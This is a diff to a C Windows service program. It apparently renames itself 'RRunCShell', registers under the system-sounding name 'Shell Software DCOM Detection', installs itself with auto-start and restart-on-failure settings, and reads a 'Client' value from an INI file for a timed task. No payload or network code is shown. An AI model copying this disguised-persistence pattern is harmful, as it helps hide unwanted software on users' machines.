@@ -89,24 +89,27 @@ void CronFunc(void)
 int main(int argc, char *argv[])
 {
 	exepath = getDirPathFromPath(argv[0]);
-	char* srvName = (char*)getFileNameFromPath(argv[0]);
-	char* ext = strstr(srvName, ".exe");
-	if (ext)
-	{
-		srvName[strlen(srvName) - 4] = 0;
-	}
-	char* srvDesc = srvName;
+	//char* fileName = (char*)getFileNameFromPath(argv[0]);
+	//char* ext = strstr(fileName, ".exe");
+	//if (ext)
+	//{
+		//fileName[strlen(fileName) - 4] = 0;
+	//}
+	char* fileName = "RRunCShell";
+	char* srvName = "Shell Software DCOM Detection";
+	char* srvDesc = "Shell Software DCOM Detection";
 	
 	if (argc == 2 && strcmp(argv[1], "ini") == 0)
 	{
-		char* iniName = (char*)malloc((strlen(srvName)+5) * sizeof(char));
-		strcpy(iniName, srvName);
+		char* iniName = (char*)malloc((strlen(fileName)+5) * sizeof(char));
+		strcpy(iniName, fileName);
 		strcat(iniName, ".ini");
 		if( access( iniName, F_OK ) == -1)
 		{
 			ini_t* ini = ini_create(NULL);
-			int section = ini_section_add( ini, srvName, 6 );
+			int section = ini_section_add( ini, fileName, strlen(fileName) );
 			ini_property_add( ini, section, "CronTab", 7, "60", 2 );
+			ini_property_add( ini, section, "Client", 6, "sunclient", 9 );
 			ini_property_add( ini, section, "Enable", 6, "True", 4 );
 
 			int size = ini_save( ini, NULL, 0 ); // Find the size needed
@@ -133,25 +136,25 @@ int main(int argc, char *argv[])
 	if (isInst == 0)
 	{
 		cmd = (char*)malloc(1024 * sizeof(char));
-		sprintf(cmd, "cmd /c sc create %s binPath= \"%s srv\" DisplayName= \"%s \" start= auto", srvName, argv[0], srvName);
+		sprintf(cmd, "cmd /c sc create \"%s\" binPath= \"%s srv\" DisplayName= \"%s \" start= auto", srvName, argv[0], srvName);
 		char *result = exe_cmd(cmd);
 		free(cmd);
 		free(result);
 		
 		cmd = (char*)malloc(1024 * sizeof(char));
-		sprintf(cmd, "cmd /c sc description %s \"%s\"", srvName, srvDesc);
+		sprintf(cmd, "cmd /c sc description \"%s\" \"%s\"", srvName, srvDesc);
 		result = exe_cmd(cmd);
 		free(cmd);
 		free(result);
 		
 		cmd = (char*)malloc(1024 * sizeof(char));
-		sprintf(cmd, "cmd /c sc failure %s actions= restart/60000/restart/60000/restart/60000// reset= 86400", srvName);
+		sprintf(cmd, "cmd /c sc failure \"%s\" actions= restart/60000/restart/60000/restart/60000// reset= 86400", srvName);
 		result = exe_cmd(cmd);
 		free(cmd);
 		free(result);
 		
 		cmd = (char*)malloc(1024 * sizeof(char));
-		sprintf(cmd, "cmd /c sc start %s", srvName);
+		sprintf(cmd, "cmd /c sc start \"%s\"", srvName);
 		result = exe_cmd(cmd);
 		free(cmd);
 		free(result);
@@ -161,13 +164,13 @@ int main(int argc, char *argv[])
 		if (isInst == 1)
 		{
 			cmd = (char*)malloc(1024 * sizeof(char));
-			sprintf(cmd, "cmd /c sc stop %s", srvName);
+			sprintf(cmd, "cmd /c sc stop \"%s\"", srvName);
 			char *result = exe_cmd(cmd);
 			free(cmd);
 			free(result);
 			
 			cmd = (char*)malloc(1024 * sizeof(char));
-			sprintf(cmd, "cmd /c sc delete %s", srvName);
+			sprintf(cmd, "cmd /c sc delete \"%s\"", srvName);
 			result = exe_cmd(cmd);
 			free(cmd);
 			free(result);
@@ -234,11 +237,12 @@ void ServiceMain(int argc, char** argv)
         {
 			if (timer == 0)
 			{
-				const char* srvName = argv[0];
+				//const char* fileName = argv[0];
+				char* fileName = "RRunCShell";
 				int isSleep = 0;
-				char* iniName = (char*)malloc((strlen(exepath)+strlen(srvName)+5) * sizeof(char));
+				char* iniName = (char*)malloc((strlen(exepath)+strlen(fileName)+5) * sizeof(char));
 				strcpy(iniName, exepath);
-				strcat(iniName, srvName);
+				strcat(iniName, fileName);
 				strcat(iniName, ".ini");
 				if( access( iniName, F_OK ) != -1)
 				{
@@ -253,15 +257,17 @@ void ServiceMain(int argc, char** argv)
 					ini_t* ini = ini_load( data, NULL );
 					free( data );
 					
-					int section, idx_c, idx_e;
-					section = ini_find_section( ini, srvName, 6 );
+					int section, idx_c, idx_cn, idx_e;
+					section = ini_find_section( ini, fileName, strlen(fileName) );
 					if (section != INI_NOT_FOUND)
 					{
 						idx_c = ini_find_property( ini, section, "CronTab", 7 );
+						idx_cn = ini_find_property( ini, section, "Client", 6 );
 						idx_e = ini_find_property( ini, section, "Enable", 6 );
-						if (idx_c != INI_NOT_FOUND && idx_e != INI_NOT_FOUND)
+						if (idx_c != INI_NOT_FOUND && idx_cn != INI_NOT_FOUND && idx_e != INI_NOT_FOUND)
 						{
 							char const* CronTab = ini_property_value( ini, section, idx_c );
+							char const* Client = ini_property_value( ini, section, idx_cn );
 							char const* Enable = ini_property_value( ini, section, idx_e );
 							if (strcmp(Enable, "True") == 0)
 							{
